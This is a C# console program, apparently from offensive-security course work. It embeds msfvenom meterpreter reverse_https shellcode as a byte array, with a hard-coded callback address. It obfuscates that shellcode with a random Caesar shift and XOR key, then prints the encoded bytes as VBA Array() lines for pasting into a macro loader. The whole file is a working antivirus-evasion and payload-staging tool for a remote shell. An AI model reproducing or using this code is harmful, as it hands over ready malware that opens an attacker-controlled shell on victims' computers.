using System;
using System.Text;
using System.Security.Cryptography;

namespace CaesarXorVba_Shellcode
{
    class Program
    {
        public static int RandomNumber()
        {
            Random rnd = new Random();
            int rn = rnd.Next(0, 256);
            return rn;
        }

        public static byte[] RandomBytes(int size)
        {
            byte[] rb = new Byte[size];
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            rng.GetBytes(rb);
            return rb;
        }

        public static string FormatByteToHex(byte data)
        {
            StringBuilder hex = new StringBuilder(2);
            hex.AppendFormat("0x{0:x2}", data);
            string formatted = hex.ToString();
            return formatted;
        }

        public static string FormatByteArrayToHex(byte[] data, string varName)
        {
            StringBuilder hex = new StringBuilder(data.Length * 2);

            for (int count = 0; count < data.Length; count++)
            {
                byte b = data[count];
                if ((count + 1) == data.Length)
                {
                    // If this is the last byte don't append a comma
                    hex.AppendFormat("{0:D}", b);
                }
                else
                {
                    hex.AppendFormat("{0:D}, ", b);
                }

                // Let's keep the output clean so only 50 bytes are in a row
                if ((count + 1) % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            // Output the array elements into a format we can just copy/paste for later use
            string formatted = $"{varName} = Array({hex.ToString()})";
            return formatted;
        }

        static void Main(string[] args)
        {
            // Generate a random shift value
            int sKey = RandomNumber();

            // Generate a random byte to XOR our shellcode with
            byte[] xKey = RandomBytes(1);
            
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=8080 EXITFUNC=thread -f csharp -v payload
            byte[] payload = new byte[581] {
            0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,
            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,
            0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,
            0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,
            0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,
            0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,
            0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,
            0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
            0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
            0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,
            0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x00,0x00,0x00,
            0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,
            0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,
            0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,
            0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,
            0x6f,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,
            0x68,0xbb,0x01,0x00,0x00,0xe8,0x09,0x01,0x00,0x00,0x2f,0x5f,0x4c,0x79,0x6a,
            0x68,0x58,0x72,0x76,0x4b,0x31,0x56,0x45,0x6c,0x45,0x57,0x56,0x4a,0x66,0x41,
            0x69,0x63,0x51,0x67,0x61,0x79,0x76,0x51,0x30,0x75,0x55,0x32,0x57,0x4f,0x6d,
            0x47,0x66,0x57,0x2d,0x4c,0x4b,0x64,0x47,0x4a,0x4a,0x42,0x2d,0x63,0x56,0x56,
            0x32,0x6d,0x50,0x2d,0x6e,0x36,0x33,0x33,0x57,0x76,0x68,0x33,0x50,0x38,0x49,
            0x37,0x65,0x79,0x6f,0x54,0x52,0x69,0x43,0x66,0x72,0x67,0x38,0x41,0x32,0x43,
            0x46,0x49,0x5a,0x63,0x4d,0x35,0x63,0x51,0x4a,0x33,0x76,0x30,0x32,0x63,0x38,
            0x69,0x51,0x59,0x64,0x67,0x63,0x57,0x50,0x77,0x70,0x70,0x55,0x6b,0x34,0x2d,
            0x72,0x4d,0x33,0x41,0x72,0x59,0x30,0x4d,0x68,0x6c,0x54,0x00,0x50,0x68,0x57,
            0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,
            0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,
            0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,
            0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,
            0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,
            0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,
            0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,
            0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,
            0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,
            0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,
            0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x37,0x34,0x00,0xbb,0xe0,0x1d,0x2a,0x0a,
            0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,
            0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };

            // Encrypt by shifting to the right (+) but you can go in either direction to start then encrypt with XOR
            byte[] encBytes = new byte[payload.Length];
            for (int i = 0; i < payload.Length; i++)
            {
                encBytes[i] = (byte)((((uint)payload[i] + sKey) & 0xFF) ^ xKey[0]);
            }

            // Decrypt XOR then shift to the left (-) as long as it's the opposite of what you shifted to start
            byte[] decBytes = new byte[encBytes.Length];
            for (int i = 0; i < encBytes.Length; i++)
            {
                decBytes[i] = (byte)((((uint)encBytes[i] ^ xKey[0]) - sKey) & 0xFF);
            }

            // Format our byte key into a format we can use later
            string xKeyStr = xKey[0].ToString();

            // Format our byte array into a variable format we can use later
            string rawStr = FormatByteArrayToHex(payload, "OffSec");
            string encStr = FormatByteArrayToHex(encBytes, "Says");
            string decStr = FormatByteArrayToHex(decBytes, "TryHarder");


            // Print results
            Console.WriteLine("[*] Shift Key:");
            Console.WriteLine(sKey);

            Console.WriteLine("\n[*] XOR Key:");
            Console.WriteLine(xKeyStr);

            Console.WriteLine("\n[*] Raw Bytes:");
            Console.WriteLine(rawStr);

            Console.WriteLine("\n[*] Encrypted Bytes");
            Console.WriteLine(encStr);

            Console.WriteLine("\n[*] Decrypted Bytes");
            Console.WriteLine(decStr + "\n");
        }
    }
}
